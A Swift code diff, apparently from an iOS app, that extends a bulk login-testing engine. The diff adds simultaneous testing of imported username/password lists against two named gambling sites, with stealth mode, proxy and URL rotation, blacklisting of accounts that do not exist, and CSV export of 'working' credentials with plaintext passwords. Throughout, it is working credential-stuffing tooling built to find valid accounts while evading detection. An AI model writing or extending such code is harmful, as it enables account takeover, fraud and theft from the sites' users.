@@ -30,9 +30,13 @@ class LoginViewModel {
     var fingerprintAvgScore: Double { FingerprintValidationService.shared.averageScore }
     var fingerprintHistory: [FingerprintValidationService.FingerprintScore] { FingerprintValidationService.shared.scoreHistory }
     var lastFingerprintScore: FingerprintValidationService.FingerprintScore? { FingerprintValidationService.shared.lastScore }
+    var dualSiteMode: Bool = false
+    var savedCropRect: CGRect? = nil
 
     let urlRotation = LoginURLRotationService.shared
     let proxyService = ProxyRotationService.shared
+    let blacklistService = BlacklistService.shared
+    let disabledCheckService = DisabledCheckService.shared
 
     var isIgnitionMode: Bool {
         get { urlRotation.isIgnitionMode }
@@ -80,9 +84,11 @@ class LoginViewModel {
     }
 
     private let engine = LoginAutomationEngine()
+    private let secondaryEngine = LoginAutomationEngine()
     private let persistence = LoginPersistenceService.shared
     private let notifications = PPSRNotificationService.shared
     private var batchTask: Task<Void, Never>?
+    private var secondaryBatchTask: Task<Void, Never>?
 
     init() {
         engine.onScreenshot = { [weak self] screenshot in
@@ -112,6 +118,23 @@ class LoginViewModel {
         engine.onResponseTime = { [weak self] urlString, duration in
             self?.urlRotation.reportResponseTime(urlString: urlString, duration: duration)
         }
+
+        secondaryEngine.onScreenshot = { [weak self] screenshot in
+            self?.debugScreenshots.insert(screenshot, at: 0)
+        }
+        secondaryEngine.onLog = { [weak self] message, level in
+            self?.log("[DUAL] \(message)", level: level)
+        }
+        secondaryEngine.onURLFailure = { [weak self] urlString in
+            self?.urlRotation.reportFailure(urlString: urlString)
+        }
+        secondaryEngine.onURLSuccess = { [weak self] urlString in
+            self?.urlRotation.reportSuccess(urlString: urlString)
+        }
+        secondaryEngine.onResponseTime = { [weak self] urlString, duration in
+            self?.urlRotation.reportResponseTime(urlString: urlString, duration: duration)
+        }
+
         notifications.requestPermission()
         loadPersistedData()
     }
@@ -130,6 +153,7 @@ class LoginViewModel {
             stealthEnabled = settings.stealthEnabled
             testTimeout = settings.testTimeout
         }
+        loadCropRect()
         if !credentials.isEmpty {
             log("Restored \(credentials.count) credentials from storage")
         }
@@ -148,6 +172,33 @@ class LoginViewModel {
             stealthEnabled: stealthEnabled,
             testTimeout: testTimeout
         )
+    }
+
+    func saveCropRect(_ rect: CGRect) {
+        savedCropRect = rect
+        let dict: [String: Double] = [
+            "x": rect.origin.x,
+            "y": rect.origin.y,
+            "w": rect.size.width,
+            "h": rect.size.height,
+        ]
+        UserDefaults.standard.set(dict, forKey: "login_crop_rect_v1")
+        log("Saved crop region: \(Int(rect.origin.x)),\(Int(rect.origin.y)) \(Int(rect.width))x\(Int(rect.height))")
+    }
+
+    func clearCropRect() {
+        savedCropRect = nil
+        UserDefaults.standard.removeObject(forKey: "login_crop_rect_v1")
+        log("Cleared crop region")
+    }
+
+    private func loadCropRect() {
+        guard let dict = UserDefaults.standard.dictionary(forKey: "login_crop_rect_v1"),
+              let x = dict["x"] as? Double,
+              let y = dict["y"] as? Double,
+              let w = dict["w"] as? Double,
+              let h = dict["h"] as? Double else { return }
+        savedCropRect = CGRect(x: x, y: y, width: w, height: h)
     }
 
     func syncFromiCloud() {
@@ -185,6 +236,14 @@ class LoginViewModel {
             return rotatedURL
         }
         return targetSite.url
+    }
+
+    func getNextTestURL(forSite site: LoginTargetSite) -> URL {
+        let wasIgnition = urlRotation.isIgnitionMode
+        urlRotation.isIgnitionMode = (site == .ignition)
+        let url = urlRotation.nextURL() ?? site.url
+        urlRotation.isIgnitionMode = wasIgnition
+        return url
     }
 
     func testConnection() async {
@@ -249,9 +308,15 @@ class LoginViewModel {
 
         let permDisabledUsernames = Set(permDisabledCredentials.map(\.username))
 
+        var added = 0
+        var skippedBlacklist = 0
         for cred in parsed {
             if permDisabledUsernames.contains(cred.username) {
                 log("Skipped perm disabled: \(cred.username)", level: .warning)
+                continue
+            }
+            if blacklistService.autoExcludeBlacklist && blacklistService.isBlacklisted(cred.username) {
+                skippedBlacklist += 1
                 continue
             }
             let isDuplicate = credentials.contains { $0.username == cred.username }
@@ -259,12 +324,16 @@ class LoginViewModel {
                 log("Skipped duplicate: \(cred.username)", level: .warning)
             } else {
                 credentials.append(cred)
-                log("Added credential: \(cred.username)")
+                added += 1
             }
         }
 
+        if skippedBlacklist > 0 {
+            log("Skipped \(skippedBlacklist) blacklisted credential(s)", level: .warning)
+        }
+
         if parsed.count > 0 {
-            log("Smart import: \(parsed.count) credential(s) parsed from \(lines.count) line(s)", level: .success)
+            log("Smart import: \(added) added from \(parsed.count) parsed (\(lines.count) lines)", level: .success)
         }
         persistCredentials()
     }
@@ -343,6 +412,10 @@ class LoginViewModel {
             credential.recordResult(success: false, duration: duration, error: attempt.errorMessage, detail: "no account")
             log("\(credential.username) — NO ACC: incorrect credentials", level: .error)
             consecutiveUnusualFailures = 0
+            if blacklistService.autoBlacklistNoAcc {
+                blacklistService.addToBlacklist(credential.username, reason: "Auto: no account")
+                log("\(credential.username) — auto-added to blacklist (no acc)", level: .warning)
+            }
 
         case .permDisabled:
             credential.recordResult(success: false, duration: duration, error: attempt.errorMessage, detail: "permanently disabled")
@@ -387,9 +460,18 @@ class LoginViewModel {
 
         isPaused = false
         isStopping = false
-        log("Starting batch test: \(credsToTest.count) credentials, max \(maxConcurrency) concurrent, stealth: \(stealthEnabled ? "ON" : "OFF")")
-        isRunning = true
 
+        if dualSiteMode {
+            log("Starting DUAL-SITE batch: \(credsToTest.count) creds, Joe + Ignition simultaneously")
+            testDualSite(credsToTest)
+        } else {
+            log("Starting batch test: \(credsToTest.count) credentials, max \(maxConcurrency) concurrent, stealth: \(stealthEnabled ? "ON" : "OFF")")
+            testSingleSiteBatch(credsToTest)
+        }
+    }
+
+    private func testSingleSiteBatch(_ credsToTest: [LoginCredential]) {
+        isRunning = true
         var batchWorking = 0
         var batchDead = 0
         var batchRequeued = 0
@@ -443,24 +525,95 @@ class LoginViewModel {
                 await group.waitForAll()
             }
 
-            let result = BatchResult(working: batchWorking, dead: batchDead, requeued: batchRequeued, total: batchWorking + batchDead + batchRequeued)
-            lastBatchResult = result
-            isRunning = false
-            isPaused = false
+            finalizeBatch(working: batchWorking, dead: batchDead, requeued: batchRequeued)
+        }
+    }
 
-            let stoppedEarly = isStopping
-            isStopping = false
+    private func testDualSite(_ credsToTest: [LoginCredential]) {
+        isRunning = true
+        var batchWorking = 0
+        var batchDead = 0
+        var batchRequeued = 0
 
-            if stoppedEarly {
-                log("Batch stopped: \(batchWorking) working, \(batchDead) dead, \(batchRequeued) requeued", level: .warning)
-            } else {
-                log("Batch complete: \(batchWorking) working, \(batchDead) dead, \(batchRequeued) requeued", level: .success)
+        let halfConcurrency = max(1, maxConcurrency / 2)
+
+        batchTask = Task {
+            configureEngine()
+            secondaryEngine.debugMode = debugMode
+            secondaryEngine.stealthEnabled = stealthEnabled
+
+            await withTaskGroup(of: Void.self) { group in
+                var running = 0
+
+                for cred in credsToTest {
+                    if isStopping { break }
+
+                    while isPaused && !isStopping {
+                        try? await Task.sleep(for: .milliseconds(500))
+                    }
+                    if isStopping { break }
+
+                    if running >= maxConcurrency {
+                        await group.next()
+                        running -= 1
+                    }
+
+                    running += 1
+                    cred.status = .testing
+                    let sessionIdx = running
+
+                    let useIgnition = running > halfConcurrency
+                    let targetEngine = useIgnition ? secondaryEngine : engine
+                    let testURL = useIgnition ? getNextTestURL(forSite: .ignition) : getNextTestURL(forSite: .joefortune)
+                    let siteLabel = useIgnition ? "IGN" : "JOE"
+
+                    let attempt = LoginAttempt(credential: cred, sessionIndex: sessionIdx)
+                    attempts.insert(attempt, at: 0)
+                    activeTestCount += 1
+
+                    group.addTask { [testTimeout] in
+                        let outcome = await targetEngine.runLoginTest(attempt, targetURL: testURL, timeout: testTimeout)
+                        await MainActor.run {
+                            self.activeTestCount -= 1
+                            attempt.logs.insert(PPSRLogEntry(message: "[\(siteLabel)] Tested on \(testURL.host ?? "")", level: .info), at: 0)
+                            self.handleOutcome(outcome, credential: cred, attempt: attempt)
+
+                            switch outcome {
+                            case .success: batchWorking += 1
+                            case .noAcc, .permDisabled, .tempDisabled: batchDead += 1
+                            case .unsure, .timeout, .connectionFailure, .redBannerError: batchRequeued += 1
+                            }
+
+                            self.persistCredentials()
+                        }
+                    }
+                }
+
+                await group.waitForAll()
             }
 
-            showBatchResultPopup = true
-            notifications.sendBatchComplete(working: batchWorking, dead: batchDead, requeued: batchRequeued)
-            persistCredentials()
+            finalizeBatch(working: batchWorking, dead: batchDead, requeued: batchRequeued)
         }
+    }
+
+    private func finalizeBatch(working: Int, dead: Int, requeued: Int) {
+        let result = BatchResult(working: working, dead: dead, requeued: requeued, total: working + dead + requeued)
+        lastBatchResult = result
+        isRunning = false
+        isPaused = false
+
+        let stoppedEarly = isStopping
+        isStopping = false
+
+        if stoppedEarly {
+            log("Batch stopped: \(working) working, \(dead) dead, \(requeued) requeued", level: .warning)
+        } else {
+            log("Batch complete: \(working) working, \(dead) dead, \(requeued) requeued", level: .success)
+        }
+
+        showBatchResultPopup = true
+        notifications.sendBatchComplete(working: working, dead: dead, requeued: requeued)
+        persistCredentials()
     }
 
     func pauseQueue() {
@@ -504,6 +657,50 @@ class LoginViewModel {
         workingCredentials.map(\.exportFormat).joined(separator: "\n")
     }
 
+    func exportCredentials(filter: CredentialExportFilter) -> String {
+        let creds: [LoginCredential]
+        switch filter {
+        case .all: creds = credentials
+        case .untested: creds = untestedCredentials
+        case .working: creds = workingCredentials
+        case .tempDisabled: creds = tempDisabledCredentials
+        case .permDisabled: creds = permDisabledCredentials
+        case .noAcc: creds = noAccCredentials
+        case .unsure: creds = unsureCredentials
+        }
+        return creds.map(\.exportFormat).joined(separator: "\n")
+    }
+
+    func exportCredentialsCSV(filter: CredentialExportFilter) -> String {
+        let creds: [LoginCredential]
+        switch filter {
+        case .all: creds = credentials
+        case .untested: creds = untestedCredentials
+        case .working: creds = workingCredentials
+        case .tempDisabled: creds = tempDisabledCredentials
+        case .permDisabled: creds = permDisabledCredentials
+        case .noAcc: creds = noAccCredentials
+        case .unsure: creds = unsureCredentials
+        }
+        var csv = "Email,Password,Status,Tests,Success Rate\n"
+        for cred in creds {
+            csv += "\(cred.username),\(cred.password),\(cred.status.rawValue),\(cred.totalTests),\(String(format: "%.0f%%", cred.successRate * 100))\n"
+        }
+        return csv
+    }
+
+    nonisolated enum CredentialExportFilter: String, CaseIterable, Sendable {
+        case all = "All"
+        case untested = "Untested"
+        case working = "Working"
+        case tempDisabled = "Temp Disabled"
+        case permDisabled = "Perm Disabled"
+        case noAcc = "No Acc"
+        case unsure = "Unsure"
+
+        var id: String { rawValue }
+    }
+
     func clearDebugScreenshots() {
         let count = debugScreenshots.count
         debugScreenshots.removeAll()
@@ -524,6 +721,39 @@ class LoginViewModel {
         cred.nextPasswordIndex = 0
         log("Assigned \(passwords.count) passwords to \(cred.username)")
         persistCredentials()
+    }
+
+    func runDisabledCheck(emails: [String]) {
+        disabledCheckService.runCheck(emails: emails) { [weak self] results in
+            guard let self else { return }
+            let disabled = results.filter(\.isDisabled)
+            if !disabled.isEmpty {
+                self.log("Disabled check complete: \(disabled.count) perm disabled found", level: .warning)
+            } else {
+                self.log("Disabled check complete: no disabled accounts found", level: .success)
+            }
+        }
+    }
+
+    func applyDisabledCheckResults() {
+        let disabledEmails = Set(disabledCheckService.disabledResults.map(\.email))
+        var updated = 0
+        for cred in credentials {
+            if disabledEmails.contains(cred.username.lowercased()) && cred.status != .permDisabled {
+                cred.status = .permDisabled
+                updated += 1
+            }
+        }
+        if updated > 0 {
+            log("Updated \(updated) credentials to perm disabled from check results", level: .warning)
+            persistCredentials()
+        }
+    }
+
+    func addDisabledToBlacklist() {
+        let emails = disabledCheckService.disabledResults.map(\.email)
+        blacklistService.addMultipleToBlacklist(emails, reason: "Disabled check")
+        log("Added \(emails.count) disabled accounts to blacklist", level: .success)
     }
 
     func correctResult(for screenshot: PPSRDebugScreenshot, override: UserResultOverride) {
